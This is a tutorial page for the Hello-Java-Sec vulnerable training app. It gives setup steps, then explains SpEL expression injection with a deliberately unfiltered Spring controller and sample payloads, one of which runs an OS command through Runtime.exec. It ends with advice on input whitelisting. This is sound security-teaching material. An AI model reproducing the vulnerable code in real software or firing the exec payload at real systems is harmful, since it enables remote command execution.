Hello-Java-Sec learning
disclaimer
This document is for learning and research purposes only. Please do not use the technical source code in this document for illegal purposes. Any negative impact caused by anyone has nothing to do with me.

Project address: https://github.com/j3ers3/Hello-Java-Sec
deploy
Configure database connection application.properties

spring.datasource.url=jdbc:mysql://127.0.0.1:3306/test
spring.datasource.username=root
spring.datasource.password=1234567
compile and run

git clone https://github.com/j3ers3/Hello-Java-Sec
cd Hello-Java-Sec
mvn clean package -DskipTests
java -jar target/hello-1.0.2.jar
access test

http://127.0.0.1:8888
Enter account password admin/admin

Remember to import db.sql in the database

Code Analysis and Vulnerability Exploitation Learning
SpEL expression injection
describe

SpEL (Spring Expression Language) expression injection is a powerful expression language for querying and manipulating object graphs at runtime. Arbitrary commands can be executed because parameters are not filtered.

Utilization principle

SpEL injection
sample code

@GetMapping("/vul")
public String spelVul(String ex) {
     ExpressionParser parser = new SpelExpressionParser();
     String result = parser. parseExpression(ex). getValue(). toString();
     System.out.println(result);
     return result;
}
attack payload

# Arithmetic operations
# http://127.0.0.1:8888/SPEL/vul?ex=100*2

# object instantiation
# http://127.0.0.1:8888/SPEL/vul?ex=new%20java.util.Date().getTime()

# Excuting an order
# T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22)
coding advice

The web view layer usually uses template technology or an expression engine to separate the interface from business data, such as EL expressions in jsp. These engines often perform sensitive operations, which can create serious vulnerabilities if external untrusted data is unfiltered and spliced into expressions for parsing.

It should be avoided that the content of external input is spliced into EL expressions or other expressions, causing the template engine to parse.

The whitelist filters external input, allowing only characters, numbers, underscores, etc.
